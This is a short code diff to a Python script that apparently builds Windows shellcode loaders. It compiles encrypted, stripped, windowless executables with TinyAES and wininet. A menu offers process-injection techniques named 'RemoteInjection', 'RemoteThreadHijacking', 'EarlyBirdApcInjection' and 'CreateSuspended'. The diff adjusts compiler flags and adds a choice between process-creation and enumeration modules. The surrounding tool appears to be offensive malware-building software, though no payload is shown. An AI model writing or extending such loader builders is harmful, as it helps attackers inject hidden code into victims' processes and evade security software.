@@ -101,7 +101,7 @@ int main()
 
     f.close()
     time.sleep(2)
-    return os.system(f"g++ --static -O2 -w -s -o {Path} Build\\main.cpp Cast\\TinyAES.c -lwininet -lws2_32 -mwindows")
+    return os.system(f"g++ --static -DNO_WINTERNL -O2 -w -s -o {Path} Build\\main.cpp Cast\\TinyAES.c -lwininet")
     #result = subprocess.run(['g++', '-o', 'chungus', 'main.cpp','-lwininet', '-lws2_32', '-mwindows'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     #print(result)
 
@@ -168,7 +168,10 @@ def main():
     else:
         Loader = set_remote_loader_type()
         if Loader == "RemoteExecutionSpells/RemoteInjection.h":
-            Enumeration = set_enum_type()
+            if get_handle_type() == "1":
+                Enumeration = set_proc_creation_type()
+            else:
+                Enumeration = set_enum_type()
         elif Loader == "RemoteExecutionSpells/RemoteThreadHijacking.h":
             Enumeration = "CreationSpells/CreateSuspended.h"
         elif Loader == "RemoteExecutionSpells/EarlyBirdApcInjection.h":
